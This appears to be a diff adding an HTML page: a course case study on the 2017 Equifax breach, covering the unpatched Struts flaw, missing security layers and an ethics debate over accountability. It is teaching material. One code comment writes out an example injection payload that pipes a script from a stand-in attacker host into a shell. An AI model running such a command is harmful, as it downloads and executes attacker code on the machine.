@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.9.37">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="Brendan Shea, PhD">
+<meta name="dcterms.date" content="2026-07-09">
+
+<title>The Equifax Breach – Computing Concepts with Python</title>
+<style>
+/* Default styles provided by pandoc.
+** See https://pandoc.org/MANUAL.html#variables-for-html for config info.
+*/
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+/* CSS for citations */
+div.csl-bib-body { }
+div.csl-entry {
+  clear: both;
+}
+.hanging-indent div.csl-entry {
+  margin-left:2em;
+  text-indent:-2em;
+}
+div.csl-left-margin {
+  min-width:2em;
+  float:left;
+}
+div.csl-right-inline {
+  margin-left:2em;
+  padding-left:1em;
+}
+div.csl-indent {
+  margin-left: 2em;
+}</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-7f8f88aac4f3542376d5c11b86a4c14d.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap-de9c745101ea7fe6478d2d324050612a.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+
+
+</head>
+
+<body class="nav-fixed quarto-light">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a class="navbar-brand" href="../../index.html">
+    <span class="navbar-title">Computing Concepts with Python</span>
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll me-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../index.html"> 
+<span class="menu-text">Home</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../v2/cases/index.html"> 
+<span class="menu-text">Case Studies</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../archive/index.html"> 
+<span class="menu-text">Archive</span></a>
+  </li>  
+  <li class="nav-item compact">
+    <a class="nav-link" href="https://github.com/brendanpshea/computing_concepts_python"> <i class="bi bi-github" role="img" aria-label="GitHub">
+</i> 
+<span class="menu-text"></span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">On this page</h2>
+   
+  <ul class="collapse">
+  <li><a href="#the-case" id="toc-the-case" class="nav-link active" data-scroll-target="#the-case">The Case</a></li>
+  <li><a href="#how-it-worked" id="toc-how-it-worked" class="nav-link" data-scroll-target="#how-it-worked">How It Worked</a></li>
+  <li><a href="#the-argument-the-breach-started" id="toc-the-argument-the-breach-started" class="nav-link" data-scroll-target="#the-argument-the-breach-started">The Argument the Breach Started</a></li>
+  <li><a href="#discussion-questions" id="toc-discussion-questions" class="nav-link" data-scroll-target="#discussion-questions">Discussion Questions</a></li>
+  <li><a href="#further-reading" id="toc-further-reading" class="nav-link" data-scroll-target="#further-reading">Further Reading</a></li>
+  <li><a href="#references" id="toc-references" class="nav-link" data-scroll-target="#references">References</a></li>
+  </ul>
+<div class="quarto-alternate-formats"><h2>Other Formats</h2><ul><li><a href="cs11_equifax_breach.docx"><i class="bi bi-file-word"></i>MS Word</a></li></ul></div></nav>
+    </div>
+<!-- main -->
+<main class="content" id="quarto-document-content">
+
+<header id="title-block-header" class="quarto-title-block default">
+<div class="quarto-title">
+<h1 class="title">The Equifax Breach</h1>
+<p class="subtitle lead">How 147 million people were harmed by a company none of them chose — a COMP 1150 case study</p>
+</div>
+
+
+
+<div class="quarto-title-meta">
+
+    <div>
+    <div class="quarto-title-meta-heading">Author</div>
+    <div class="quarto-title-meta-contents">
+             <p>Brendan Shea, PhD </p>
+          </div>
+  </div>
+    
+    <div>
+    <div class="quarto-title-meta-heading">Published</div>
+    <div class="quarto-title-meta-contents">
+      <p class="date">July 9, 2026</p>
+    </div>
+  </div>
+  
+    
+  </div>
+  
+
+
+</header>
+
+
+<div class="case-at-a-glance">
+<ul>
+<li><strong>Who:</strong> Equifax, one of three companies that quietly hold financial dossiers on nearly every adult in America; Richard Smith, its CEO; the security staff who circulated a patch warning that never reached the right servers; and 147 million people who never agreed to any of it.</li>
+<li><strong>What:</strong> In 2017, attackers walked through a single unpatched hole in a public website and, over eleven unwatched weeks, copied the Social Security numbers, birth dates, and addresses of nearly half the U.S. population. Almost every safeguard that should have stopped them was missing, expired, or misconfigured.</li>
+<li><strong>Where / When:</strong> Equifax’s consumer-dispute portal, breached mid-May 2017; discovered July 29; disclosed September 7. Attributed by the U.S. Department of Justice, in 2020, to four members of the Chinese military.</li>
+<li><strong>Why it matters:</strong> The victims were not Equifax’s customers. They were its product — data collected without consent, held without permission, and impossible to take back. This case is about the collision between <span class="key-term">breach inevitability</span> — the grim truth that any defender can be beaten — and <span class="key-term">accountability</span>, the question of who answers when the people harmed never had a choice.</li>
+<li><strong>Concepts at play:</strong> known vulnerabilities and patching, remote code execution as <span class="key-term">untrusted input becoming code</span>, certificates and monitoring, credential storage, <span class="key-term">defense in depth</span>, data as a liability</li>
+</ul>
+</div>
+<section id="the-case" class="level2">
+<h2 class="anchored" data-anchor-id="the-case">The Case</h2>
+<p>On March 7, 2017, the Apache Software Foundation published an urgent fix. A flaw in Struts — free software that thousands of companies use to build websites — let an attacker send a specially crafted web request and make the server <em>run commands</em>. Not read data. Run commands. The flaw got a name, CVE-2017-5638, and a severity score near the maximum. The message to everyone using Struts was blunt: patch now.</p>
+<p>Equifax used Struts. Its own security team saw the alert and did the right thing — it sent a company-wide email telling the responsible teams to apply the patch. But the email went to a distribution list that did not include the people running a system called ACIS, the online portal where consumers dispute errors on their credit reports. A follow-up scan, meant to catch any server that had missed the patch, was pointed at the wrong directory and found nothing. And so, on one public-facing website, the hole stayed open.</p>
+<div class="context-box">
+<p><strong>A known vulnerability, and the patch gap.</strong> A <span class="key-term">vulnerability</span> is a weakness an attacker can exploit. When researchers find one in widely used software, it is published with an ID (a “CVE”) and, usually, a patch. That publication is a double-edged sword: defenders learn to fix it, but attackers learn exactly what to look for. The dangerous window is the gap between “patch available” and “patch applied” — and applying patches across thousands of servers is unglamorous, endless work that is easy to get slightly wrong. Equifax’s gap was about two months. Attackers need only one.</p>
+</div>
+<p>In the middle of May, they came through it. Once inside that single web server, the attackers found they could go almost anywhere. The network was not divided into sealed compartments, so one foothold opened onto dozens of systems. They discovered files containing usernames and passwords stored in plain, readable text — the keys to 51 different databases, left lying in the open. And then they began, patiently, to take what those databases held.</p>
+<p>For seventy-six days, nobody noticed.</p>
+<p>They should have. Equifax ran a device designed to inspect traffic leaving the network and flag anything suspicious — exactly the kind of monitoring that catches a slow leak. But to inspect encrypted traffic, that device needed a valid security certificate, and its certificate had expired <em>nineteen months earlier</em>. For over a year and a half, the guard at the exit had been standing with its eyes closed. The attackers pulled data out in small, unremarkable chunks, week after week, and the alarm that should have screamed stayed silent.</p>
+<div class="context-box">
+<p><strong>Defense in depth, and why the first mistake isn’t the whole story.</strong> No serious security rests on a single wall. <span class="key-term">Defense in depth</span> means stacking independent safeguards, so that when one fails — and one always eventually fails — another is waiting: divide the network so a single breach can’t reach everything; store credentials as unreadable hashes, never plain text; watch the exits for data leaving. Equifax’s break-in was one failure. Its <em>catastrophe</em> was that behind that failure stood no second layer, no third, no fourth. The depth of the collapse, not the first open door, is what turned a break-in into a national event.</p>
+</div>
+<p>On July 29, a technician finally renewed the expired certificate. The monitoring device blinked awake — and instantly lit up with eleven weeks of theft, already complete. The data of 147 million people was gone: names, Social Security numbers, birth dates, addresses, some driver’s license numbers, and the credit card numbers of hundreds of thousands.</p>
+<p>What followed made the wound worse. In the weeks between the internal discovery and the public announcement, three Equifax executives sold company stock; one, Jun Ying, was later convicted of insider trading. When Equifax finally told the public on September 7, it directed worried people to a hastily built website — one that looked so much like a scam that security tools flagged it, and Equifax’s own official Twitter account, confused, sent users to a lookalike site a researcher had set up to prove the point. The company offered free credit monitoring, provided by Equifax itself, initially wrapped in fine print requiring customers to give up their right to sue.</p>
+<p>CEO Richard Smith retired and was called before Congress. In 2019, Equifax agreed to a settlement worth up to roughly $700 million. In 2020, the Justice Department indicted four members of the Chinese People’s Liberation Army for the intrusion.</p>
+<p>And then the story simply… ended. The stock recovered. The company grew. The people whose most sensitive numbers now circulate forever received, most of them, a few dollars or an offer of monitoring. The interesting question was never <em>how</em> the breach happened — the autopsy is thorough and damning. It is <em>who was supposed to pay for it, and why almost no one did.</em></p>
+</section>
+<section id="how-it-worked" class="level2">
+<h2 class="anchored" data-anchor-id="how-it-worked">How It Worked</h2>
+<p>The break-in and the catastrophe are two different technical stories. The first is about a single class of bug. The second is about everything that wasn’t there to catch it.</p>
+<section id="the-break-in-when-input-becomes-a-command" class="level3">
+<h3 class="anchored" data-anchor-id="the-break-in-when-input-becomes-a-command">The break-in: when input becomes a command</h3>
+<p>The Struts flaw belongs to the most important family of vulnerabilities in this whole subject: input that the program treats as <em>code</em> instead of <em>data</em>. The attacker sends what looks like an ordinary piece of a web request, but the server, instead of just reading it, <em>executes</em> it.</p>
+<p>You can see the shape of the bug in a tiny, deliberately foolish “calculator” that runs whatever a user types:</p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> calculate(expression):</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="bu">eval</span>(expression)   <span class="co"># runs the input as a Python command</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(calculate(<span class="st">"2 + 2"</span>))       <span class="co"># 4</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(calculate(<span class="st">"100 * 12"</span>))    <span class="co"># 1200</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p>For a user typing <code>2 + 2</code>, this works perfectly — which is exactly why such bugs survive. But <code>eval</code> doesn’t <em>check</em> anything; it runs whatever arrives. Hand it something that isn’t arithmetic at all —</p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># An attacker doesn't send "2 + 2". They send code:</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="co">#   __import__('os').system('curl evil.example/steal | sh')</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="co"># and the server, treating input as a command, runs it.</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p>— and the calculator becomes a way to run the attacker’s commands on your machine. That is <span class="key-term">remote code execution</span>, the most dangerous outcome in security, and it is the same root confusion behind every injection attack: <strong>the program let untrusted input cross the line from data into code.</strong> Struts made that mistake while parsing a header almost nobody thinks about. The fix, then and always, is to treat input as inert data and never let it reach a place where it can execute.</p>
+</section>
+<section id="the-catastrophe-the-layers-that-werent-there" class="level3">
+<h3 class="anchored" data-anchor-id="the-catastrophe-the-layers-that-werent-there">The catastrophe: the layers that weren’t there</h3>
+<p>One open door lets an attacker in. It should not let them reach everything, stay for months, and leave with half a country’s identities. That it did is a story of missing layers — each one a safeguard that, had it existed, would have shrunk the disaster. Walk the attack past the defenses that should have met it:</p>
+<table class="caption-top table">
+<colgroup>
+<col style="width: 33%">
+<col style="width: 33%">
+<col style="width: 33%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>Stage of the attack</th>
+<th>What should have stopped it</th>
+<th>What Equifax had</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Crafted request hits the portal</td>
+<td>the patch, applied within days</td>
+<td>a two-month gap; the alert never reached the team</td>
+</tr>
+<tr class="even">
+<td>Attacker spreads from one server</td>
+<td>network segmentation, sealing compartments</td>
+<td>a flat network; one foothold reached dozens of systems</td>
+</tr>
+<tr class="odd">
+<td>Attacker reads database logins</td>
+<td>credentials stored as unreadable hashes</td>
+<td>usernames and passwords in plain text</td>
+</tr>
+<tr class="even">
+<td>Data streams out for 76 days</td>
+<td>monitoring that watches the exits</td>
+<td>a monitor blinded by a certificate expired 19 months</td>
+</tr>
+</tbody>
+</table>
+<p>Read the table top to bottom and a pattern appears: not one failure, but four, stacked — and each was a lesson known to the field for decades. The attacker needed a single hole. Equifax needed all four defenses working, on every system, continuously, for years. That asymmetry is real, and it is the strongest thing that can be said in the company’s defense. It is also where the argument begins.</p>
+</section>
+</section>
+<section id="the-argument-the-breach-started" class="level2">
+<h2 class="anchored" data-anchor-id="the-argument-the-breach-started">The Argument the Breach Started</h2>
+<p>The positions connect: each answers the one before.</p>
+<section id="the-negligence-argument-this-was-preventable" class="level3">
+<h3 class="anchored" data-anchor-id="the-negligence-argument-this-was-preventable">The negligence argument: this was preventable</h3>
+<p>To the congressional investigators who spent a year reconstructing the breach, the conclusion was not close. A patch existed for two months. The scan that should have caught the miss was misconfigured. Credentials sat in plain text. The monitoring certificate had been dead for over a year. Any one of these, fixed, might have stopped or shrunk the theft.</p>
+<div class="argument">
+<p><strong>The Negligence Argument</strong></p>
+<ol type="1">
+<li>Equifax held some of the most sensitive data in the country, which imposes a correspondingly high duty of care.</li>
+<li>The failures were not exotic — an unapplied patch, a flat network, plaintext passwords, dead monitoring — and each was a well-known, basic safeguard.</li>
+<li>Multiple independent safeguards were absent at once, so this was not one unlucky slip but a systemic collapse of ordinary care.</li>
+<li>Therefore the breach was preventable negligence, and Equifax is responsible for the harm it caused.</li>
+</ol>
+</div>
+<p>The evidence is the autopsy itself <span class="citation" data-cites="houseoversight2018">(<a href="#ref-houseoversight2018" role="doc-biblioref">U.S. House of Representatives, Committee on Oversight and Government Reform 2018</a>)</span>. The weight rests on premise 2 — that these were <em>basic</em> measures a competent custodian would have had. That is the premise the reply contests, by arguing that “basic” is a fantasy of hindsight.</p>
+</section>
+<section id="the-inevitability-reply-any-defender-can-be-beaten" class="level3">
+<h3 class="anchored" data-anchor-id="the-inevitability-reply-any-defender-can-be-beaten">The inevitability reply: any defender can be beaten</h3>
+<p>Security professionals — including many with no love for Equifax — push back on the comfort of the word <em>preventable</em>. Defense, they point out, is brutally asymmetric. And the attacker here was not a bored teenager; it was, according to the Justice Department, a unit of a nation’s military <span class="citation" data-cites="doj2020equifax">(<a href="#ref-doj2020equifax" role="doc-biblioref">U.S. Department of Justice 2020</a>)</span>.</p>
+<div class="argument">
+<p><strong>The Inevitability Reply</strong></p>
+<ol type="1">
+<li>An attacker needs to find one weakness; a defender must cover every weakness, on every system, at every moment, forever.</li>
+<li>In any large organization, there is <em>always</em> some unpatched server, some misconfiguration, some expired certificate — perfect security is not an achievable state.</li>
+<li>This attacker was a well-resourced nation-state, against which even elite defenders have fallen.</li>
+<li>Therefore “could a mistake be found?” is the wrong test — a mistake can always be found afterward — and calling the breach simple negligence mistakes the ordinary condition of computing for a special failure.</li>
+</ol>
+</div>
+<p>There is real steel here, and every honest engineer feels it. Breaches are not rare accidents; they are a constant background weather, and hindsight makes every one look avoidable. But notice what the reply proves and what it doesn’t. It shows that <em>perfect</em> security is impossible — which is true, and which no one disputes. It says nothing about whether Equifax exercised <em>reasonable</em> care, and nothing at all about the question the next move raises: whoever is to blame for the hole, why did the cost land where it did?</p>
+<p><strong>The accountability objection.</strong> Grant the reply entirely. Say breaches are inevitable. The scandal then is not the hole; it is the <em>incentive structure</em> around it. When a store leaks its customers’ data, those customers can leave, and the fear of that loss pressures the store to invest in security. Equifax faced no such pressure, because <strong>the people it harmed were never its customers.</strong> You do not choose Equifax. You cannot quit Equifax. It gathers its dossier on you whether you consent or not, and sells it to others. So the market signal that is supposed to punish bad security — customers walking away — cannot reach it, because the victims were never doing business there to begin with. The security writer Bruce Schneier names the deeper problem: data is not an asset but a <em>toxic asset</em>, a liability that, when it leaks, poisons other people — much like industrial pollution <span class="citation" data-cites="schneier2016">(<a href="#ref-schneier2016" role="doc-biblioref">Schneier 2016</a>)</span>. And pollution is not controlled by hoping factories care. It is controlled by making them liable for the damage downstream. This objection reframes the whole dispute: the negligence argument and the inevitability reply are fighting over blame for the door, while the people who actually paid stand outside the argument entirely, having never been asked.</p>
+</section>
+<section id="where-it-rests-today-a-cost-of-doing-business" class="level3">
+<h3 class="anchored" data-anchor-id="where-it-rests-today-a-cost-of-doing-business">Where it rests today: a cost of doing business</h3>
+<p>The years since sharpened the objection rather than answering it. Data-breach notification laws spread across the states, so companies must now <em>tell</em> you when they lose your data — a real gain in transparency that changes the incentives less than it seems. Settlements grew larger, but for a company Equifax’s size, even $700 million reads as a cost of doing business, a bad quarter rather than an existential threat. The tidy lesson — collect less data, since you cannot lose what you never held — is widely praised and almost universally ignored, as every company races to gather more. Equifax itself is now larger than it was in 2017.</p>
+<p>Which leaves the question the case cannot escape. If losing the defining personal data of 147 million people — people who never signed up, never consented, and can never get that data back — costs a company less than a single good quarter, then what, exactly, is the deterrent? And if the answer is <em>almost none</em>, then the choice is stark: either we accept that the custodians of our most sensitive information have little reason to protect it, or we decide, as we once decided about factories and rivers, that some harms are too widely shared to be left to the goodwill of those who profit from causing them. Whose job is it to make that choice — and why has no one made it?</p>
+</section>
+</section>
+<section id="discussion-questions" class="level2">
+<h2 class="anchored" data-anchor-id="discussion-questions">Discussion Questions</h2>
+<ol type="1">
+<li>The break-in worked because the server treated untrusted input as commands to run, instead of as data to read. Explain that idea in your own words. Then give an everyday example — outside computing — where mixing up “instructions” and “information” could go badly wrong.</li>
+<li>State the Negligence Argument and the Inevitability Reply in your own words. Are they disagreeing about the <em>facts</em> of what happened, or about the <em>standard</em> a company should be held to? Defend your reading.</li>
+<li>You are the security lead the week the Struts patch is released. You have a hundred urgent tasks and a patch that probably doesn’t affect any critical system. Walk through how you decide what to do — and name the pressures that could lead you into Equifax’s mistake.</li>
+<li>Pick an industry that handles something hazardous: a bank with money, a chemical plant, an airline. Should a company that holds your personal data be regulated more like that industry? Argue for a position.</li>
+<li>You cannot opt out of Equifax, and you were never its customer. Does a company owe a <em>different</em> duty to people who chose it than to people who never did? If so, what should that duty be?</li>
+</ol>
+</section>
+<section id="further-reading" class="level2">
+<h2 class="anchored" data-anchor-id="further-reading">Further Reading</h2>
+<ul>
+<li>The U.S. House Oversight Committee’s investigation — the detailed autopsy of the patch, the certificate, and the credentials <span class="citation" data-cites="houseoversight2018">(<a href="#ref-houseoversight2018" role="doc-biblioref">U.S. House of Representatives, Committee on Oversight and Government Reform 2018</a>)</span>.</li>
+<li>The Government Accountability Office’s report on the breach and the federal response <span class="citation" data-cites="nist2017equifax">(<a href="#ref-nist2017equifax" role="doc-biblioref">U.S. Government Accountability Office 2018</a>)</span>.</li>
+<li>The Department of Justice indictment attributing the intrusion to four members of the Chinese military <span class="citation" data-cites="doj2020equifax">(<a href="#ref-doj2020equifax" role="doc-biblioref">U.S. Department of Justice 2020</a>)</span>.</li>
+<li>Bruce Schneier, “Data Is a Toxic Asset” — the argument that held data is a liability to be minimized, not an asset to be hoarded <span class="citation" data-cites="schneier2016">(<a href="#ref-schneier2016" role="doc-biblioref">Schneier 2016</a>)</span>.</li>
+<li>The Federal Trade Commission’s summary of the settlement and what affected people were owed <span class="citation" data-cites="ftc2019equifax">(<a href="#ref-ftc2019equifax" role="doc-biblioref">U.S. Federal Trade Commission 2019</a>)</span>.</li>
+</ul>
+</section>
+<section id="references" class="level2">
+<h2 class="anchored" data-anchor-id="references">References</h2>
+<div id="refs" class="references csl-bib-body hanging-indent" role="list">
+<div id="ref-schneier2016" class="csl-entry" role="listitem">
+Schneier, Bruce. 2016. <em>Data Is a Toxic Asset</em>. Schneier on Security. <a href="https://www.schneier.com/essays/archives/2016/03/data_is_a_toxic_asse.html">https://www.schneier.com/essays/archives/2016/03/data_is_a_toxic_asse.html</a>.
+</div>
+<div id="ref-doj2020equifax" class="csl-entry" role="listitem">
+U.S. Department of Justice. 2020. <em>Chinese Military Personnel Charged with Computer Fraud, Economic Espionage and Wire Fraud for Hacking into Credit Reporting Agency <span>Equifax</span></em>. DOJ Office of Public Affairs press release. <a href="https://www.justice.gov/opa/pr/chinese-military-personnel-charged-computer-fraud-economic-espionage-and-wire-fraud-hacking">https://www.justice.gov/opa/pr/chinese-military-personnel-charged-computer-fraud-economic-espionage-and-wire-fraud-hacking</a>.
+</div>
+<div id="ref-ftc2019equifax" class="csl-entry" role="listitem">
+U.S. Federal Trade Commission. 2019. <em><span>Equifax</span> Data Breach Settlement</em>. FTC Consumer Advice. <a href="https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement">https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement</a>.
+</div>
+<div id="ref-nist2017equifax" class="csl-entry" role="listitem">
+U.S. Government Accountability Office. 2018. <em>Data Protection: Actions Taken by <span>Equifax</span> and Federal Agencies in Response to the 2017 Breach</em>. GAO-18-559. GAO. <a href="https://www.gao.gov/products/gao-18-559">https://www.gao.gov/products/gao-18-559</a>.
+</div>
+<div id="ref-houseoversight2018" class="csl-entry" role="listitem">
+U.S. House of Representatives, Committee on Oversight and Government Reform. 2018. <em>The <span>Equifax</span> Data Breach: Majority Staff Report</em>. U.S. House of Representatives. <a href="https://oversight.house.gov/report/committee-releases-report-revealing-new-information-equifax-data-breach/">https://oversight.house.gov/report/committee-releases-report-revealing-new-information-equifax-data-breach/</a>.
+</div>
+</div>
+
+
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+  window.document.addEventListener("DOMContentLoaded", function (event) {
+    const icon = "";
+    const anchorJS = new window.AnchorJS();
+    anchorJS.options = {
+      placement: 'right',
+      icon: icon
+    };
+    anchorJS.add('.anchored');
+    const isCodeAnnotation = (el) => {
+      for (const clz of el.classList) {
+        if (clz.startsWith('code-annotation-')) {                     
+          return true;
+        }
+      }
+      return false;
+    }
+    const onCopySuccess = function(e) {
+      // button target
+      const button = e.trigger;
+      // don't keep focus
+      button.blur();
+      // flash "checked"
+      button.classList.add('code-copy-button-checked');
+      var currentTitle = button.getAttribute("title");
+      button.setAttribute("title", "Copied!");
+      let tooltip;
+      if (window.bootstrap) {
+        button.setAttribute("data-bs-toggle", "tooltip");
+        button.setAttribute("data-bs-placement", "left");
+        button.setAttribute("data-bs-title", "Copied!");
+        tooltip = new bootstrap.Tooltip(button, 
+          { trigger: "manual", 
+            customClass: "code-copy-button-tooltip",
+            offset: [0, -8]});
+        tooltip.show();    
+      }
+      setTimeout(function() {
+        if (tooltip) {
+          tooltip.hide();
+          button.removeAttribute("data-bs-title");
+          button.removeAttribute("data-bs-toggle");
+          button.removeAttribute("data-bs-placement");
+        }
+        button.setAttribute("title", currentTitle);
+        button.classList.remove('code-copy-button-checked');
+      }, 1000);
+      // clear code selection
+      e.clearSelection();
+    }
+    const getTextToCopy = function(trigger) {
+      const outerScaffold = trigger.parentElement.cloneNode(true);
+      const codeEl = outerScaffold.querySelector('code');
+      for (const childEl of codeEl.children) {
+        if (isCodeAnnotation(childEl)) {
+          childEl.remove();
+        }
+      }
+      return codeEl.innerText;
+    }
+    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+      text: getTextToCopy
+    });
+    clipboard.on('success', onCopySuccess);
+    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+        text: getTextToCopy,
+        container: window.document.getElementById('quarto-embedded-source-code-modal')
+      });
+      clipboardModal.on('success', onCopySuccess);
+    }
+      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+      var mailtoRegex = new RegExp(/^mailto:/);
+        var filterRegex = new RegExp('/' + window.location.host + '/');
+      var isInternal = (href) => {
+          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+      }
+      // Inspect non-navigation links and adorn them if external
+     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+      for (var i=0; i<links.length; i++) {
+        const link = links[i];
+        if (!isInternal(link.href)) {
+          // undo the damage that might have been done by quarto-nav.js in the case of
+          // links that we want to consider external
+          if (link.dataset.originalHref !== undefined) {
+            link.href = link.dataset.originalHref;
+          }
+            // target, if specified
+            link.setAttribute("target", "_blank");
+            if (link.getAttribute("rel") === null) {
+              link.setAttribute("rel", "noopener");
+            }
+        }
+      }
+    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+      const config = {
+        allowHTML: true,
+        maxWidth: 500,
+        delay: 100,
+        arrow: false,
+        appendTo: function(el) {
+            return el.parentElement;
+        },
+        interactive: true,
+        interactiveBorder: 10,
+        theme: 'quarto',
+        placement: 'bottom-start',
+      };
+      if (contentFn) {
+        config.content = contentFn;
+      }
+      if (onTriggerFn) {
+        config.onTrigger = onTriggerFn;
